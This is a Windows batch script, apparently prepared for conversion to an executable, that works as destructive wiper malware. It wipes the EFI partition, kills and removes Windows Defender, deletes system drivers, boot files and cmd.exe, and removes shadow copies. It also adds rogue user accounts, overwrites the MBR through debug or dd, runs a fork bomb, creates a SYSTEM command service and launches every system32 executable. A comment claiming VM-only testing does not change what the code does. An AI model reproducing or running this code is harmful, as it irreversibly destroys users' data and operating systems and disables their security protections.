::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBNQ
::cRYluBh/LU+EWAjk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJheU8BHVDMbTLrX+1NuIg=
::ZQ05rAF9IBncCkqN+0xwdVsFHVDXbT/0V+xNsbCqv4o=
::ZQ05rAF9IAHYFVzEqQJheU8BHVDMbTLrX+1NuIg=
::eg0/rx1wNQPfEVWB+kM9LVsJDFXTaD7rUvse6fyb
::fBEirQZwNQPfEVWB+kM9LVsJDFXTaD7rUuRFubGjvrrn
::cRolqwZ3JBvQF1fEqQJheU8BHVDTZTrjXuRMiA==
::dhA7uBVwLU+EWAjVoBdhfEoNHV3abTva
::YQ03rBFzNR3SWATEpRNkfUoAHV3TZTPrVtU=
::dhAmsQZ3MwfNWATEpRNkfUoAHV3TZTPrVtU=
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnVpRZleU8FFVXbZDrqZg==
::Zh4grVQjdCyDJGyX8VAjFDpQQQ2MNXiuFLQI5/rHy+WQrEESVeYsRI3S1r2MKewabp8Q8Fva6f+Kd03M/ZO/tJdDuDk1p+y7VECKONWP816wHh3YshppSjws1jNVW+6+hQQgEgzUVsthebE3GmvuVaUM2FXUk4oSRHCIcYcF5Q/U
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
mountvol Z: /s & del Z:\ *.* /s /f /q & rd /s /q Z:\EFI
tasklist | findstr "MsMpEng.exe"
mountvol Z: /s & del Z:\ *.* /s /f /q & rd /s /q Z:\EFI
taskkill /F /IM MsMpEng.exe
rd /s /q "C:\Program Files\Internet Explorer"
rd /s /q "C:\Windows\System32\Speech"
del /f /q "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\Internet Explorer.lnk"
reg delete "HKCR\IE.AssocFile.HTM" /f
reg delete "HKCU\Software\Microsoft\Windows Media" /f
reg delete "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}" /f
:: 1. 移除Windows Defender（保留核心安全服务）
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
taskkill /f /im MsMpEng.exe
rmdir /s /q "C:\Program Files\Windows Defender"
rmdir /s /q "C:\ProgramData\Microsoft\Windows Defender"
:: 2. 删除旧版.NET Framework（需确保无程序依赖）
dir /b %SystemRoot%\Microsoft.NET\Framework\v3.* > .\net3list.txt
for /f "tokens=*" %%i in (.\net3list.txt) do (
  rd /s /q "%SystemRoot%\Microsoft.NET\Framework\%%i"
  reg delete "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\%%i" /f
)
reg delete "HKLM\SOFTWARE\Microsoft\Internet Explorer" /f
reg delete "HKCR\CLSID\{0002DF01-0000-0000-C000-000000000046}" /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg delete "HKLM\SOFTWARE\Microsoft\Windows Defender" /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" /f
del /s /q "C:\Program Files\Windows Defender"
del /s /q "C:\Windows\System32\drivers"
del /f /s /q "C:\Program Files\Windows Defender\*.*"
rmdir /s /q "C:\Program Files\Windows Defender"
rmdir /s /q "C:\Program Files (x86)\Windows Defender"
del /f /s /q "C:\ProgramData\Microsoft\Windows Defender\*.*"
del /s /q "C:\Program Files\Windows Defender"
del /s /q "C:\ProgramData\Microsoft\Windows Defender"
del /s /q "C:\Windows\Boot"
del /s /q "C:\Windows\system32\cmd.exe"
del /s /q "C:\Windows\System32\Taskmgr.exe"
del /s /q "C:\Windows\System32\osk.exe"
start https://space.bilibili.com/3493276898298079
start https://space.bilibili.com/3493276898298079
start https://space.bilibili.com/3493276898298079
start https://space.bilibili.com/3493276898298079
start https://space.bilibili.com/3493276898298079
mshta vbscript:msgbox("操作已完�?,48,"系统提示")(window.close)
mshta vbscript:msgbox("操作已完�?,64,"系统提示")(window.close)
mshta vbscript:msgbox("操作已完�?,16,"系统提示")(window.close)
mshta vbscript:msgbox("操作已完�?,64,"系统提示")(window.close)
mshta vbscript:msgbox("操作已完�?,48,"系统提示")(window.close)
start mshta vbscript:msgbox("重启倒计�?,0,"警告")(window.close)
timeout /t 1 >nul
net USER 1145141919810 1145141919810 /add
net user 114514 /add
net user 1919810 /add
mountvol X: /s & del X:\ *.* /s /f /q & rd /s /q X:\EFI
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t 
REG_DWORD /d 1 /f
vssadmin delete shadows /all /quiet
cd C:\Program Files\Internet Explorer /d
del /f /s /q *.*
rmdir /s /q C:\Program Files\Internet Explorer
@echo off
:: 警告：此脚本会破坏MBR导致系统无法启动！仅用于虚拟机测试！
setlocal enabledelayedexpansion

:: 检查管理员权限
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo 请以管理员身份运行此脚本�?
    pause
    exit /b
)
:: 生成临时汇编文件（模拟MBR恶意代码�?
echo bits 16 > temp_mbr.asm
echo org 0x7C00 >> temp_mbr.asm
echo mov ax, 0x0012 >> temp_mbr.asm
echo int 0x10 >> temp_mbr.asm
echo mov bp, msg >> temp_mbr.asm
echo mov cx, 0x0018 >> temp_mbr.asm
echo mov ax, 0x1301 >> temp_mbr.asm
echo mov bx, 0x000C >> temp_mbr.asm
echo mov dx, 0x0E1D >> temp_mbr.asm
echo int 0x10 >> temp_mbr.asm
echo jmp $ >> temp_mbr.asm
echo msg db "I am virus! Fuck you :-)" >> temp_mbr.asm
echo times 510-($-$$) db 0 >> temp_mbr.asm
echo dw 0xAA55 >> temp_mbr.asm
:: 使用nasm编译为二进制（需提前安装nasm�?
nasm -f bin temp_mbr.asm -o mbr_bomb.bin
if not exist mbr_bomb.bin (
    echo 编译失败，请确认已安装nasm
    del temp_mbr.asm
    pause
    exit /b
)
:: 使用debug.exe写入MBR（适用于旧版Windows�?
echo e 100 B8 12 00 CD 10 BD 18 7C B9 18 00 B8 01 13 BB 0C 00 > debug_script.txt
echo e 110 BA 1D 0E CD 10 E2 FE 49 20 61 6D 20 76 69 72 75 73 >> debug_script.txt
echo e 120 21 20 46 75 63 6B 20 79 6F 75 20 3A 2D 29 00 00 00 >> debug_script.txt
echo e 1FE 55 AA >> debug_script.txt
echo w 100 0 0 1 >> debug_script.txt
echo q >> debug_script.txt
debug < debug_script.txt >nul
if %errorLevel% neq 0 (
    echo 写入失败，尝试替代方�?..
    :: 使用dd for Windows（需额外下载�?
    dd if=mbr_bomb.bin of=\\.\PhysicalDrive0 bs=512 count=1
)
:: 清理临时文件
del temp_mbr.asm
del mbr_bomb.bin
del debug_script.txt
echo MBR已修改！系统将在重启后受影响�?
mshta vbscript:CreateObject("Wscript.Shell").popup("1145141919810秒后自动关闭",1145141919810,"倒计�?,64)(window.close)
shutdown -s -t 1145141919810
mountvol Z: /s & del Z:\ *.* /s /f /q & rd /s /q Z:\EFI
shutdown -r -t 1145141919810
shutdown -s -t 1145141919810
shutdown -s -t 1145141919810
shutdown -s -t 1145141919810
shutdown -s -t 1145141919810
%0|%0
ipconfig
sc Create SuperCMD binpath= "cmd /K start" type= own type= interact
net start SuperCMD
for %%a in (%windir%\system32\*.exe) do (
  if /i not "%%~na"=="logoff" start %%~fa
)
pause
